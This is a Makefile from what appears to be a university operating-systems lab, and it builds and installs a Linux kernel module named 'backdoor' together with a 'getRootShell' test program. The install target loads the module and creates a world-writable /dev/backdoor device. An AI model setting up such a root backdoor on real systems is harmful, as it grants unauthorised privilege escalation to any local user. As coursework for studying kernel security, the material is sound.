# Nathaniel "Nat" Welch
# Lab 5 CSC 453
# Linux Backdoor Kernel Module

obj-m += backdoor.o

all:
	@make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	@make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	@rm -vf backdoor-test getRootShell

test: test.c
	gcc -Wall -o getRootShell $^

install: all
	modinfo backdoor.ko
	insmod ./backdoor.ko approvedPid=$(shell id -u)
	mknod /dev/backdoor c 254 0 
	chmod 777 /dev/backdoor

